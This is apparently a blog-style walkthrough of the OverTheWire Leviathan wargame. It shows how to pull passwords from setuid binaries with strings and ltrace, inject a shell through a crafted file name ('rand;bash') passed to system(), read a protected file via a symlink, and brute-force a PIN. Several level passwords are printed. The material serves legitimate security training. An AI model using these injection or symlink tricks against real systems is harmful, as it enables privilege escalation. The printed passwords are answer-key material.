CTF | OverTheWire | Leviathan

SSH protocol (also referred to as Secure Shell) is a method for secure remote login from one computer to another. It provides several alternative options for strong authentication, and it protects the communications security and integrity with strong encryption

Ssh Pass is a tiny utility, which allows you to provide the ssh password without using  
the prompt. This will very helpful for scripting. Ssh Pass is not good to use in multi user environment [sshpass docs](https://linux.die.net/man/1/sshpass)

⚠️ **Disclaimer**: This solution was generated in May 2024. If you are accessing this information at a later date, please note that circumstances may have changed. Different levels of flags, variations in levels, and even new levels altogether might have been introduced. Please verify the most current and relevant information before making any decisions based on this content.

Leviathan : This Labs doesn't provide any kind of hint, guide in levaithan page

```bash
sudo apt-get install sshpass
sshpass -p `cat file_name` ssh user@leviathan.labs.overthewire.org -p 2223
```

**Bandit** Level 0
SSH Information  
Host: leviathan.labs.overthewire.org  
Port: 2223

How to connect to labs

```bash
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

Save a file , content `leviathan` and name as leviathan0

```password
leviathan0
```

In order to every time copy paste those hash every level , we are using `sshpass` pipe those string into ssh password field

```bash
sshpass -p $(cat leviathan0) ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

**Level 0**:

```bash
ls -a # we got .backup hidden folder
cd .backup
ls -a
cat bookmarks.html
cat bookmarks.html | grep "password"
```

```
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

---

**Level 1**:

```
ls
file check
```

check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c7acb418cff514a706855be5cb59e985ca67b6d3, for GNU/Linux 3.2.0, not stripped

```
./check # setuid need password
```

```bash
strings check | less

# let try love , secrf as password
__gmon_start__
secrf
love
password:
/bin/sh
Wrong password, Good Bye ...
;*2$"0

# we got nothing from love , scref
```

- `check` is setuid file
- `less` command is a Linux utility that can be used **to read the contents of a text file one page (one screen) at a time**
- `ltrace` **intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process**

```bash
ltrace ./check
password:TypingSomething
```

In 7 Line of the output , `ltrace` intercept compare using `strcmp()` `typ` with `***` , password might change from different period

```c
_libc_start_main(0x80491e6, 1, 0xffffd6a4, 0 <unfinished ...>
printf("password: ")                                                                                 = 10
getchar(0xf7fbe4a0, 0xf7fd6f90, 0x786573, 0x646f67password: TypeSomething
)                                                  = 84
getchar(0xf7fbe4a0, 0xf7fd6f54, 0x786573, 0x646f67)                                                  = 121
getchar(0xf7fbe4a0, 0xf7fd7954, 0x786573, 0x646f67)                                                  = 112
strcmp("Typ", "sex")                                                                                 = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                 = 29
+++ exited (status 0) +++
```

```bash
./check
sex
```

```bash
$ cat /etc/leviathan_pass/leviathan2
```

---

**Level 2:**

```bash
ls -a
file printfile
```

printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1692a8137aaa87af2147f88e09b2efa3135e6f3a, for GNU/Linux 3.2.0, not stripped

```
./printfile
```

```
*** File Printer ***
Usage: ./printfile filename
```

```bash
./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

```bash
ltrace ./printfile /etc/leviathan_pass/leviathan3
```

```c
__libc_start_main(0x80491e6, 2, 0xffffd674, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                 = -1
puts("You cant have that file..."You cant have that file...
)                          = 27
+++ exited (status 1) +++
```

In Line 2 , it shows that using `access()` some kind of lib method to access file to `-1`
Let try `ltrace ./printfile /etc/`

```c
access("/etc/", 4)                                          = 0
snprintf("/bin/cat /etc/", 511, "/bin/cat %s", "/etc/")     = 14
geteuid()                                                   = 12002
geteuid()                                                   = 12002
setreuid(12002, 12002)                                      = 0
system("/bin/cat /etc/"/bin/cat: /etc/: Is a directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 256
```

in Line 2 , it show `snprintf()` , has four parameters and `access("/etc/", 4) = 0`
last parameter take to the third parameter using `%s` format specifier , and then we can blitz like cmd line execution in line 6 `system()` call and try `./printfile /etc/adduser.conf` it showing content , make temp directory using `mktemp -d`

```bash
cd /tmp/tmp.xyIIGjCrrh
touch rand;bash
exit
ls
rand # bash not created
rm rand # removing rand
touch 'rand;bash'
ls
rand;bash # file
```

touch will create like rand;bash and also open sub shell inside terminal and `exit`
so using `'rand;bash'` will create single file as `rand;bash` quoted
The tilde `~` is a Linux "shortcut" to denote a user's home directory , we are using cli injection by `;`

```bash
~/printfile 'rand;bash' # or ~/printfile rand\;bash
/bin/cat: rand: Permission denied
leviathan3@gibson:/tmp/tmp.xyIIGjCrrh$ # look closely we got access
cat /etc/leviathan_pass/leviathan3
```

---

**Level 3:**

`-A 10` refers to first 10 lines

```bash
strings ./level3 | grep -A 10 "password"
```

```c
Enter the password>
;*2$"
secret
GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
uR	6
uY	c
printf
__off_t
_IO_read_ptr
_chain
strcmp
```

In Line 3 has `secret` let try,

```bash
ltrace ./level3
```

```c
__libc_start_main(0x80492bf, 1, 0xffffd6a4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                         = -1
printf("Enter the password> ")                                     = 20
fgets(Enter the password> secret
"secret\n", 256, 0xf7e2a620)                                 = 0xffffd47c
strcmp("secret\n", "snlprintf\n")                                  = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                         = 19
+++ exited (status 0) +++
```

in line 6 `secret` cmp with `snlprintf` then try this.

```
snlprintf
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA
```

**Level 4:**

```bash
ls -a
.  ..  .bash_logout  .bashrc  .profile  .trash
cd .trash/
ls
file bin
```

bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8a80a5de629bf55ff162e8110099b5c4e77a4bb1, for GNU/Linux 3.2.0, not stripped

```
./bin
```

```
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
```

`tr` is translate cmd , the space replaced with new line

```bash
./bin | tr " " "\n"
```

```
01000101
01001011
01001011
01101100
01010100
01000110
00110001
01011000
01110001
01110011
00001010
```

`bc` is and CLI calculator ,input_base = 2 , output_base = 16 , `16,2` are number systems

```bash
./bin | tr " " "\n" | while read line; do echo "obase=16;ibase=2;$line"| bc;done
```

```
45
4B
4B
6C
54
46
31
58
71
73
A
```

`tr -d \n` this deletes new line those

```bash
./bin | tr " " "\n" | while read line; do echo "obase=16;ibase=2;$line"| bc;done | tr -d "\n" | xxd -r -p
```

`xxd -r -p`
-p , -ps --> Output in postscript continuous hexdump style
-r , -revert -->
Reverse operation: convert (or patch) hexdump into binary

```
EKKlTF1Xqs
```

---

**Level 5:**

```bash
ls
./leviathan5
```

```
Cannot find /tmp/file.log
```

```
echo "hello" > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
hello
```

it deleting that `/tmp/file.log` after execution
`ln` - it create link between two files , to use `-symbolic` or `-s` to creates a symbolic link named linked_file to original_file

```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
ls /tmp/file.log -la
```

```bash
lrwxrwxrwx 1 leviathan5 leviathan5 30 Mar 29 09:47 /tmp/file.log -> /etc/leviathan_pass/leviathan6
```

current user has all privilege , then execute that binary file

```bash
./leviathan5
YZ55XPVk2l
```

---

**Level 6:**

```bash
ls
./leviathan6
usage: ./leviathan6 <4 digit code>
```

file need 4 digit number as password , so let brute force

```bash
for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
```

```
7123
$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
```

**Level 7**
It is the last Level , with only Congrats !!! text
Thats All



